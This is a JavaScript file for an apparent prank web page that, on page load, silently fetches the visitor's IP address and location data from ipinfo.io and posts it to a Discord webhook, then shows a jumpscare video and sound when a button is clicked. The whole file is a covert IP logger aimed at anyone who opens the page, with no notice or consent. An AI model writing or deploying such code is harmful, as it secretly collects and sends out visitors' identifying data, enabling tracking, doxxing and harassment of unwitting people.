// script.js

// Function to send IP to Discord webhook
async function sendIPToDiscord() {
  try {
    const response = await fetch('https://ipinfo.io/json');
    const data = await response.json();

    const webhookUrl = 'YOUR_DISCORD_WEBHOOK_URL';
    const payload = {
      content: `IP Info: ${JSON.stringify(data)}`,
    };

    await fetch(webhookUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(payload),
    });
  } catch (error) {
    console.error('Failed to send IP info:', error);
  }
}

// Trigger the jumpscare on button click
document.getElementById('reload-button').addEventListener('click', () => {
  const jumpscare = document.getElementById('jumpscare');
  const video = document.getElementById('jumpscare-video');
  const audio = document.getElementById('jumpscare-audio');

  document.querySelector('.content').style.display = 'none';
  jumpscare.style.display = 'flex';
  video.play();
  audio.play();
});

// Send IP info to Discord on page load
sendIPToDiscord();
